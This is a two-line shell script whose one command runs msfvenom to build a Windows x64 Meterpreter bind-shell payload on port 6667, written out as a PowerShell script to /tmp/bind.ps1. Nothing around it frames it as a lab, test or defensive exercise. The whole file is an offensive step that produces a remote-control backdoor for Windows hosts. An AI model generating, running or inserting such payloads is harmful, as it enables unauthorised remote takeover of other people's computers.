#!/bin/sh
msfvenom -p windows/x64/meterpreter/bind_tcp --platform windows LPORT=6667 -f psh-net -o /tmp/bind.ps1
